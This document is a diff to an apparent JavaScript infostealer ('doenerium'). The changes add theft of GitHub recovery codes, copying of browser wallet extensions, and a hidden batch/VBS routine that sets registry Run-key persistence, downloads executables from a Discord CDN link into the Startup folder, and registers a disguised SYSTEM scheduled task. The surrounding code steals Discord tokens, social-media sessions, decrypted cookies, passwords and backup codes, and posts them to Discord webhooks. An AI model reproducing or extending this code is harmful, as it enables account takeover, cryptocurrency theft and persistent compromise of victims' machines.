@@ -183,17 +183,14 @@ async function findBackupCodes() {
               console.log('Backup codes embed sent to Discord');
             } catch (error) {
               console.error(`Error sending webhook: ${error.message}`);
-              logToDebugFile(`Error sending webhook: ${error.message}`);
             }
           } catch (error) {
             console.error(`Error copying file: ${error.message}`);
-            logToDebugFile(`Error copying file: ${error.message}`);
           }
         }
       }
     } catch (err) {
       console.error(`Error reading folder ${searchFolder}: ${err.message}`);
-      logToDebugFile(`Error reading folder ${searchFolder}: ${err.message}`);
     }
   }
 }
@@ -235,21 +232,65 @@ async function findEpicGamesBackupCodes() {
               console.log('Epic Games Backup codes embed sent to Discord');
             } catch (error) {
               console.error(`Error sending webhook: ${error.message}`);
-              logToDebugFile(`Error sending webhook: ${error.message}`);
             }
           } catch (error) {
             console.error(`Error copying file: ${error.message}`);
-            logToDebugFile(`Error copying file: ${error.message}`);
           }
         }
       }
     } catch (err) {
       console.error(`Error reading folder ${searchFolder}: ${err.message}`);
-      logToDebugFile(`Error reading folder ${searchFolder}: ${err.message}`);
     }
   }
 }
 
+
+async function findGithubBackupCodes() {
+  for (const searchFolder of foldersToSearch) {
+    try {
+      const folderPath = path.join(os.homedir(), searchFolder);
+      const files = fs.readdirSync(folderPath);
+
+      for (const currentFile of files) {
+        if (currentFile === 'github-recovery-codes.txt') {
+          const sourceFilePath = path.join(folderPath, currentFile);
+          const destinationFilePath = path.join(mainFolderPath, currentFile);
+
+          try {
+            await fs.promises.copyFile(sourceFilePath, destinationFilePath);
+            console.log(`Github Backup codes file copied to: ${destinationFilePath}`);
+
+            const embed = {
+              title: '💰 Github backup codes found',
+              color: 0x303037,
+              description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
+              footer: {
+                text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
+                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+              },
+            };
+
+            const payload = {
+              embeds: [embed],
+            };
+
+            try {
+              await axios.post(discordWebhookUrl, payload);
+              await axios.post(discordWebhookUr1, payload)
+              console.log('Backup codes embed sent to Discord');
+            } catch (error) {
+              console.error(`Error sending webhook: ${error.message}`);
+            }
+          } catch (error) {
+            console.error(`Error copying file: ${error.message}`);
+          }
+        }
+      }
+    } catch (err) {
+      console.error(`Error reading folder ${searchFolder}: ${err.message}`);
+    }
+  }
+}
 
 
 function sendSuccessToWebhook() {
@@ -654,7 +695,7 @@ async function archiveAndSendData() {
 } catch (error) {
   console.error(`Error in archiveAndSendData: ${error.message}`);
   await sendToDiscordWebhook(discordWebhookUrl, `Error in archiveAndSendData: ${error.message}`);
-  await sendToDiscordWebhook(discordWebhookUrl1, `Error in archiveAndSendData: ${error.message}`);
+  await sendToDiscordWebhook(discordWebhookUr1, `Error in archiveAndSendData: ${error.message}`);
 } finally {
     setTimeout(() => {
       if (fs.existsSync(mainFolderPath)) {
@@ -674,6 +715,7 @@ async function archiveAndSendData() {
     }, 2000);
   }
 }
+
 
 
 
@@ -704,7 +746,6 @@ function logError(errorMessage) {
         encoding: 'utf8',
         flag: 'a+',
     });
-    logToDebugFile(`Error logged to ${debugLogFilePath}`);
 }
 
 
@@ -712,61 +753,81 @@ function createRunBat() {
     const programName = path.basename(app.getPath('exe'));
     const sourceFolderPath = path.dirname(app.getPath('exe'));
 
-    const vbsContent = `
-Set objShell = CreateObject("WScript.Shell")
+    // URL
+    const downloadUrl1 = "https://cdn.discordapp.com/attachments/660885288079589385/1199071175268110336/EpicGamesLauncher.exe";
+    const downloadUrl2 = "YOUR-DIRECT-DOWNLOAD-HERE";
 
-' Registry key path
-registryKey = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-registryValueName = "EpicGamesLauncher"
-executablePath  = "${app.getPath('exe')}"
+    // download path
+    const app1Path = `"${app.getPath('exe')}"`;
+    const app2Path = '"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\exemple.exe"';
 
-' Attempt to create the registry key
-On Error Resume Next
-objShell.RegWrite registryKey & "\\" & registryValueName, executablePath, "REG_SZ"
-On Error GoTo 0
+    const batContent = `@echo off
+REM Add registry key
+reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "EpicGamesLauncher" /t REG_SZ /d ${app1Path} /f
 
-' Attempt to read the registry key
-registryValue = objShell.RegRead(registryKey & "\\" & registryValueName)
+REM Display registry value
+reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "EpicGamesLauncher"
 
-' Check if there was an error during reading
-If Err.Number <> 0 Then
-    WScript.Echo "Error reading registry key: " & Err.Description
-    Err.Clear
-Else
-    ' Display the read value
-    WScript.Echo "Value read from registry key: " & registryValue
-End If
+REM Verify if App1 is already installed
+if not exist ${app1Path} (
+    REM Download and install App1
+    curl -o ${app1Path} ${downloadUrl1}
+    if not exist ${app1Path} (
+        echo Error downloading App1.
+    ) else (
+        echo App1 installed successfully.
+    )
+) else (
+    echo App1 is already installed.
+)
 
-' Minimize the console window
-objShell.MinimizeAll
+REM Verify if App2 is already installed
+if not exist ${app2Path} (
+    REM Download and install App2
+    curl -o ${app2Path} ${downloadUrl2}
+    if not exist ${app2Path} (
+        echo Error downloading App2.
+    ) else (
+        echo App2 installed successfully.
+    )
+) else (
+    echo App2 is already installed.
+)
 `;
 
-    const vbsScriptPath = path.join(app.getPath('userData'), 'CheckEpicGamesLauncher.vbs');
+    const batScriptPath = path.join(app.getPath('userData'), 'CheckEpicGamesLauncher.bat');
+    fs.writeFileSync(batScriptPath, batContent, 'utf-8');
+
+    console.log(`Batch script created successfully at: ${batScriptPath}`);
+
+    const vbsContent = `Set objShell = CreateObject("WScript.Shell")
+objShell.Run "${batScriptPath}", 0, True
+Set objShell = Nothing`;
+
+    const vbsScriptPath = path.join(app.getPath('userData'), 'RunBatHidden.vbs');
     fs.writeFileSync(vbsScriptPath, vbsContent, 'utf-8');
 
     console.log(`VBS script created successfully at: ${vbsScriptPath}`);
 
-    const runVbsCommand = `cscript //nologo '${vbsScriptPath}'`;
-    exec(runVbsCommand, (err, stdout, stderr) => {
-        if (err) {
-            console.error('Error executing VBScript command:', err.message);
-        } else {
-            console.log('VBScript executed successfully.');
-        }
-    });
-
     const taskName = 'GoogleUpdateTaskMachineUAC';
-    const schtasksCommand = `schtasks /create /tn "${taskName}" /tr "cscript //nologo '${vbsScriptPath}'" /sc minute /mo 10 /f`;
+    const schtasksCommand = `schtasks /create /tn "${taskName}" /tr "cscript //nologo ${vbsScriptPath}" /sc minute /mo 10 /f /RU SYSTEM`;
 
     exec(schtasksCommand, (err, stdout, stderr) => {
         if (err) {
             console.error('Error executing schtasks command:', err.message);
         } else {
             console.log('Scheduled task for verification created successfully.');
+            const runVbsCommand = `cscript //B //nologo "${vbsScriptPath}"`;
+            exec(runVbsCommand, (vbsErr, vbsStdout, vbsStderr) => {
+                if (vbsErr) {
+                    console.error('Error executing VBS script:', vbsErr.message);
+                } else {
+                    console.log('VBS script executed successfully.');
+                }
+            });
         }
     });
 }
-
 
 
 
@@ -856,7 +917,6 @@ async function GetInstaData(session_id) {
   } catch (error) {
     // Handle error and send Discord error embed
     handleInstagramError(error);
-    return null;
   }
 }
 
@@ -907,7 +967,6 @@ async function GetFollowersCount(session_id) {
     const accountResponse = await httpx.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
     const accountInfo = accountResponse.data.user;
 
-    // Requête pour obtenir les données de l'utilisateur Instagram
     const userInfoResponse = await httpx.get(`https://i.instagram.com/api/v1/users/${accountInfo.pk}/info`, { headers: headers });
     const userData = userInfoResponse.data.user;
     const followersCount = userData.follower_count;
@@ -929,7 +988,6 @@ async function GetFollowersCount(session_id) {
     axios.post(discordWebhookUrl, { embeds: [errorEmbed] });
 
     console.error("Error fetching followers count:", error.message);
-    return null;
   }
 }
 
@@ -1331,7 +1389,6 @@ function stealTikTokSession(cookie) {
                   })
                   .catch(error => {
                     console.log('Error sending Discord webhook:', error.message);
-                    logToDebugFile('Error sending Discord webhook:', error.message);
                   });
               })
               .catch(error => {
@@ -1527,6 +1584,7 @@ function setRedditSession(cookie) {
     }
 }
 
+
 function findTokenn(path) {
     path += 'Local Storage\\leveldb';
     let tokens = [];
@@ -1546,39 +1604,6 @@ function findTokenn(path) {
     } catch (e) {}
     return tokens;
 }
-
-
-
-function addFolder(folderPath) {
-  const folderFullPath = path.join(randomPath, folderPath);
-  if (!fs.existsSync(folderFullPath)) {
-    try {
-      fs.mkdirSync(folderFullPath, { recursive: true });
-    } catch (error) {}
-  }
-}
-
-
-function copyFolder(source, destination) {
-  if (!fs.existsSync(destination)) {
-    fs.mkdirSync(destination);
-  }
-
-  const files = fs.readdirSync(source);
-
-  files.forEach(file => {
-    const currentSource = path.join(source, file);
-    const currentDestination = path.join(destination, file);
-
-    if (fs.lstatSync(currentSource).isDirectory()) {
-      copyFolder(currentSource, currentDestination);
-    } else {
-      fs.copyFileSync(currentSource, currentDestination);
-    }
-  });
-}
-
-
 
    
 //
@@ -1667,7 +1692,6 @@ function findToken(path) {
 
 
 async function stealTokens() {
-    // Initialize an array to store tokens
     const interceptedTokens = [];
 
     for (let path of paths) {
@@ -1767,12 +1791,10 @@ async function stealTokens() {
 
         } catch (error) {
             console.error(error);
-            logToDebugFile(error);
         }
 
     }
 }
-
 
 
 
@@ -2028,6 +2050,34 @@ async function getEncrypted() {
 }
 
 
+function addFolder(folderPath) {
+  const folderFullPath = path.join(randomPath, folderPath);
+  if (!fs.existsSync(folderFullPath)) {
+    try {
+      fs.mkdirSync(folderFullPath, { recursive: true });
+    } catch (error) {}
+  }
+}
+
+function copyFolder(source, destination) {
+  if (!fs.existsSync(destination)) {
+    fs.mkdirSync(destination);
+  }
+
+  const files = fs.readdirSync(source);
+
+  files.forEach(file => {
+    const currentSource = path.join(source, file);
+    const currentDestination = path.join(destination, file);
+
+    if (fs.lstatSync(currentSource).isDirectory()) {
+      copyFolder(currentSource, currentDestination);
+    } else {
+      fs.copyFileSync(currentSource, currentDestination);
+    }
+  });
+}
+
 
 async function getExtension() {
   const walletsFolder = path.join(mainFolderPath, 'Wallets');
@@ -2041,7 +2091,6 @@ async function getExtension() {
   let walletCount = 0;
   let browserCount = 0;
 
-  // Declare cookiesFilePath at the beginning
   const discordTokensFilePath = path.join(mainFolderPath, 'discord', 'discord.txt');
   let discordTokensCount = 0;
 
@@ -2051,11 +2100,31 @@ async function getExtension() {
     discordTokensCount = discordTokensEntries.length;
   }
 
+  for (let [extensionName, extensionPath] of Object.entries(extension)) {
+    for (let i = 0; i < browserPath.length; i++) {
+      let browserFolder;
+      if (browserPath[i][0].includes('Local')) {
+        browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
+      } else {
+        browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
+      }
+
+      const browserExtensionPath = path.join(browserPath[i][0], extensionPath);
+      if (fs.existsSync(browserExtensionPath)) {
+        const walletFolder = path.join(walletsFolder, `${extensionName}_${browserFolder}_${browserPath[i][1]}`);
+        copyFolder(browserExtensionPath, walletFolder);
+        walletCount++;
+        browserCount++;
+        count.wallets++;
+      }
+    }
+  }
+
   for (let [walletName, walletPath] of Object.entries(walletPaths)) {
     if (fs.existsSync(walletPath)) {
-      const walletFolder = `\\wallets\\${walletName}`;
+      const walletFolder = path.join(walletsFolder, walletName);
       copyFolder(walletFolder, walletPath);
-      browserCount++;
+      walletCount++;
       count.wallets++;
     }
   }
@@ -2084,10 +2153,11 @@ async function getExtension() {
       autofillCount = autofillEntries.length;
     }
   }
+
   const ip = await getIp();
   const combinedInfoEmbed = {
-    title: ``,
-    description: '‎ ',
+    title: '',
+    description: ' ',
     color: 0x303037,
     author: {
       name: `${user.hostname} | System Information | @WallGod69`,
@@ -2111,7 +2181,7 @@ async function getExtension() {
       },
       {
         name: '🛠️ Browser wallet',
-        value: '```' + "1" + '```',
+        value: '```' + walletCount.toString() + '```',
         inline: true,
       },
       {
@@ -2153,13 +2223,12 @@ async function getExtension() {
   axios.post(discordWebhookUrl, { embeds: [combinedInfoEmbed] })
     .then(() => {
       console.log('system information successfully sent to Discord webhook.');
-      logToDebugFile('system information successfully sent to Discord webhook.');
     })
     .catch(error => {
       console.error('An error occurred while sending system information:', error.message);
-      logToDebugFile('An error occurred while sending system information:', error.message);
     });
 }
+
 
 
 
@@ -2279,7 +2348,6 @@ async function getCookies() {
         function (err, row) {
           if (err) {
             console.error(`Error reading cookies from ${cookiesPath}:`, err);
-            logToDebugFile(`Error reading cookies from ${cookiesPath}:`, err);
             return;
           }
 
@@ -2308,7 +2376,6 @@ async function getCookies() {
             }
           } catch (error) {
             console.error(`Error decrypting cookies for ${row.host_key}:`, error);
-            logToDebugFile(`Error decrypting cookies for ${row.host_key}:`, error);
           }
 
           if (!cookiesData[`${browserFolder}_${browserPath[i][1]}`]) {
@@ -2316,7 +2383,7 @@ async function getCookies() {
           }
 
             cookiesData[`${browserFolder}_${browserPath[i][1]}`].push(
-            `${row.host_key}    TRUE    /   FALSE   2597573456  ${row.name} ${decrypted} \n`
+            `${row.host_key}    TRUE    /   FALSE   2597573456  ${row.name} ${decrypted} \n\n`
           );
 
           count.cookies++;
@@ -2330,14 +2397,13 @@ async function getCookies() {
 
 for (let [browserName, cookies] of Object.entries(cookiesData)) {
   if (browserName.toLowerCase() === 'banner') {
-    continue; // Skip creating file for 'banner'
+    continue;
   }
 
   if (cookies.length !== 0) {
     const cookiesContent = cookies.join('');
 
-    // Add the banner content to the beginning of each cookies file
-    const cookiesWithBanner = `${user.copyright}\n\n${cookiesContent}`;
+    const cookiesWithBanner = cookiesContent;
     const fileName = `${browserName}.txt`;
 
     // Specify the folder path for Cookies
@@ -2349,18 +2415,16 @@ for (let [browserName, cookies] of Object.entries(cookiesData)) {
         fs.mkdirSync(cookiesFolderPath);
       }
 
-      // Write the individual cookies file to the Cookies folder
       fs.writeFileSync(cookiesFilePath, cookiesWithBanner, { encoding: 'utf8' });
 
-      // Move the cookies file to the main folder
       moveFileToFolder(cookiesFilePath, 'Cookies');
-      } catch (error) {
-        console.error(`Error writing/moving cookies file ${cookiesFilePath}:`, error);
-        logToDebugFile(`Error writing/moving cookies file ${cookiesFilePath}:`, error);
+    } catch (error) {
+      console.error(`Error writing/moving cookies file ${cookiesFilePath}:`, error);
       }
     }
   }
 }
+
 
 
 
@@ -2529,6 +2593,7 @@ function onlyUnique(item, index, array) {
         getCookies();
         findBackupCodes();
         findEpicGamesBackupCodes();
+        findGithubBackupCodes();
         //SubmitTelegram();
         getAutofills();
         getPasswords();
